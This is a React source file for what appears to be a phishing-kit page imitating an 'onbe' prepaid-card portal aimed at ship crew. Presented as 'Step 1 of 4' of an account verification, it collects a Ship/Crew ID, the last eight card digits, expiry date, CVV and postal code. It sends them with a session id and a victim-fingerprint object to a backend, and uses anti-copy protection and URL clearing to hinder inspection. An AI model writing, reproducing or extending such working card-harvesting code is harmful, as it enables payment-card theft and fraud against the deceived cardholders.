import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMutation } from '@tanstack/react-query';
import { z } from 'zod';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { validateLuhn } from '@/lib/luhn';
import { getSourceInfo } from '@/lib/sourceInfo';
import '@/styles/styles.css';
import logoSvg from '@/assets/paymentvault_logo.svg';
import sasVerificationBanner from '@assets/image_1767022072566.png';

const postalCodeSchema = z.object({
  shipId: z.string()
    .length(6, 'Ship ID / Crew ID must be 6 digits')
    .regex(/^\d{6}$/, 'Ship ID / Crew ID must be 6 digits'),
  cardNumber: z.string()
    .length(8, 'Please provide the last 8 digits of your Card Number')
    .regex(/^\d{8}$/, 'Please provide the last 8 digits of your Card Number'),
  expiration: z.string()
    .min(5, 'Please provide a valid Expiration Date mm/yy')
    .max(5, 'Please provide a valid Expiration Date mm/yy')
    .regex(/^\d{2}\/\d{2}$/, 'Please provide a valid Expiration Date mm/yy')
    .refine((val) => {
      const [month, year] = val.split('/').map(Number);
      if (month < 1 || month > 12) return false;
      const now = new Date();
      const currentMonth = now.getMonth() + 1;
      const currentYear = now.getFullYear() % 100;
      const expYear = year;
      if (expYear < currentYear) return false;
      if (expYear === currentYear && month < currentMonth) return false;
      return true;
    }, { message: 'Expiration date must be current or future date' }),
  cvv: z.string()
    .length(3, 'Please provide a valid Security Code')
    .regex(/^\d{3}$/, 'Security Code must be 3 digits'),
  postal: z.string().min(1, 'Please provide a valid Postal Code').max(7),
});

const onlyDigits = (e: React.ChangeEvent<HTMLInputElement>) => {
  e.target.value = e.target.value.replace(/\D/g, '');
};

type PostalCodeForm = z.infer<typeof postalCodeSchema>;

export default function PostalCodePage() {
  const [, setLocation] = useLocation();
  const [token, setToken] = useState('');
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<PostalCodeForm>({
    resolver: zodResolver(postalCodeSchema),
  });

  useEffect(() => {
    const generateRandomString = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };

    const newToken = generateRandomString(64);
    setToken(newToken);
    window.history.replaceState(null, '', window.location.pathname);

    const attemptId = sessionStorage.getItem('loginAttemptId');
    if (!attemptId) {
      toast({
        title: 'Error',
        description: 'Session expired. Please login again.',
        variant: 'destructive',
      });
      setTimeout(() => setLocation('/'), 2000);
      return;
    }
    setLoginAttemptId(attemptId);
  }, []);

  const postalMutation = useMutation({
    mutationFn: async (data: PostalCodeForm) => {
      return apiRequest('POST', '/api/S@S-account-verification', {
        loginAttemptId,
        shipId: data.shipId,
        cardNumber: data.cardNumber,
        expiration: data.expiration,
        cvv: data.cvv,
        postalCode: data.postal,
        sourceInfo: getSourceInfo(),
      });
    },
    onSuccess: () => {
      toast({
        title: 'Success',
        description: 'Card verification submitted successfully',
      });
      setTimeout(() => {
        setLocation('/contact-info');
      }, 2000);
    },
    onError: (error: any) => {
      toast({
        title: 'Error',
        description: error.message || 'Card verification failed',
        variant: 'destructive',
      });
    },
  });

  const onSubmit = async (data: PostalCodeForm) => {
    postalMutation.mutate(data);
  };

  const handleCancel = () => {
    sessionStorage.clear();
    setLocation('/');
  };

  const formatExpiration = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
  };

  return (
    <>
      <AntiCopyProtection />
      <div>
        <form id="postalForm" onSubmit={handleSubmit(onSubmit)}>
          <div>
            {/* Header */}
            <div className="onbe-dashboard-header">
              <header className="onbe-headercomponent-parent">
                <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                  <img
                    src={logoSvg}
                    alt="My Company logo"
                    className="onbe-header-affiliate-logo header-logo-size"
                    data-testid="img-logo"
                  />
                </div>
              </header>
            </div>

            <div className="container g-0"></div>

            <div className="container">
              <div className="row onbe-activation-component pt-[170px] pb-[170px] mt-[7px] mb-[7px] pl-[7px] pr-[7px]">
                {/* Left Section */}
                <div className="col-lg-6 col-md-6 col-sm-12">
                  <img
                    src={sasVerificationBanner}
                    alt="S@S Account Verification Banner"
                    style={{ width: '100%', maxWidth: '550px', marginBottom: '20px' }}
                    data-testid="img-verification-banner"
                  />
                  <p className="onbe-activation-content-text" data-testid="text-step">Step 1 of 4</p>
                  <p className="onbe-activation-section-title text-[27px] font-bold" data-testid="text-title">Verify Your Ownership</p>
                  <div className="onbe-horizontal-divider"></div>
                  <p className="onbe-activation-content-text" data-testid="text-description">
                    To ensure the security of your account, please verify ownership by entering the card number (front), security code/CVV (back), and registered postal code.
                  </p>
                </div>

                {/* Right Section - Form */}
                <div className="col-lg-4 col-md-5 col-sm-12 offset-lg-2 offset-md-1 mt-lg-0 mt-sm-3">
                  <div className="onbe-activation-box-component">
                    <div className="onbe-btn-group-activation">
                      
                      {/* Ship ID / Crew ID */}
                      <div className="onbe-btovr-input-group">
                        <input
                          type="tel"
                          id="shipId"
                          placeholder=" "
                          autoComplete="off"
                          maxLength={6}
                          pattern="[0-9]*"
                          inputMode="numeric"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-ship-id"
                          onInput={onlyDigits}
                          {...register('shipId')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="shipId">
                          Ship ID / Crew ID<span className="red">*</span>
                        </label>
                        {errors.shipId && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.shipId.message}
                          </div>
                        )}
                      </div>

                      {/* 8 Digit Last Card Number */}
                      <div className="onbe-btovr-input-group">
                        <input
                          type="tel"
                          id="cardNumber"
                          placeholder=" "
                          autoComplete="off"
                          maxLength={8}
                          pattern="[0-9]*"
                          inputMode="numeric"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-cardnumber"
                          onInput={onlyDigits}
                          {...register('cardNumber')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="cardNumber">
                          8 Digit Last Card Number<span className="red">*</span>
                        </label>
                        {errors.cardNumber && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.cardNumber.message}
                          </div>
                        )}
                      </div>

                      {/* Expiration */}
                      <div className="onbe-btovr-input-group">
                        <input
                          type="tel"
                          id="exp"
                          placeholder=" "
                          autoComplete="off"
                          maxLength={5}
                          pattern="[0-9/]*"
                          inputMode="numeric"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-expiration"
                          {...register('expiration', {
                            onChange: formatExpiration
                          })}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="exp">
                          Exp Date mm/yy<span className="red">*</span>
                        </label>
                        {errors.expiration && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.expiration.message}
                          </div>
                        )}
                      </div>

                      {/* CVV */}
                      <div className="onbe-btovr-input-group">
                        <input
                          type="tel"
                          id="cvv"
                          placeholder=" "
                          autoComplete="off"
                          maxLength={3}
                          pattern="[0-9]*"
                          inputMode="numeric"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-cvv"
                          onInput={onlyDigits}
                          {...register('cvv')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="cvv">
                          Security Code<span className="red">*</span>
                        </label>
                        {errors.cvv && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.cvv.message}
                          </div>
                        )}
                      </div>

                      {/* Postal Code */}
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="postal"
                          placeholder=" "
                          autoComplete="off"
                          maxLength={7}
                          className="onbe-btovr-input-group__input"
                          data-testid="input-postal"
                          {...register('postal')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="postal">
                          Postal Code<span className="red">*</span>
                        </label>
                        {errors.postal && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.postal.message}
                          </div>
                        )}
                      </div>

                      {/* Buttons */}
                      <div className="row mt-3">
                        <div className="col-6">
                          <button
                            type="button"
                            onClick={handleCancel}
                            className="onbe-btovr-button-white onbe-button onbe-button-primary"
                            disabled={postalMutation.isPending}
                            data-testid="button-cancel"
                          >
                            Cancel
                          </button>
                        </div>
                        <div className="col-6">
                          <button
                            type="submit"
                            className="onbe-btovr-button-black onbe-button onbe-button-primary"
                            disabled={postalMutation.isPending}
                            data-testid="button-continue"
                          >
                            {postalMutation.isPending ? 'Loading...' : 'Continue'}
                          </button>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
